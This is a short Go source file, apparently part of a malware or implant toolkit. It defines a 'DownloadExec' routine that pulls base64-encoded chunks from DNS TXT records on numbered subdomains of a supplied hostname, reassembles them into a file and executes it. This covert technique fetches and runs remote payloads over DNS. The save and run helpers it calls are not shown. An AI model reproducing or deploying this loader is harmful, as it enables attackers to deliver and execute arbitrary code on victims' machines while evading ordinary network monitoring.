package downloader

import (
	"bytes"
	"encoding/base64"
	"net"
	"strconv"
)

type DnsTxtDownload struct {
}

func (d *DnsTxtDownload) DownloadExec(hostname string) {
	var chunks [][]byte
	count := 0

	for {
		sub := strconv.Itoa(count)
		rec, err := net.LookupTXT(sub + "." + hostname)
		if err != nil {
			return
		}

		if rec[0] == "" {
			break
		}

		chunk, err := base64.StdEncoding.DecodeString(rec[0])
		if err != nil {
			return
		}

		chunks = append(chunks, chunk)
		count++
	}

	data := bytes.Join(chunks, []byte(""))
	filename := save(data)
	run(filename)
}
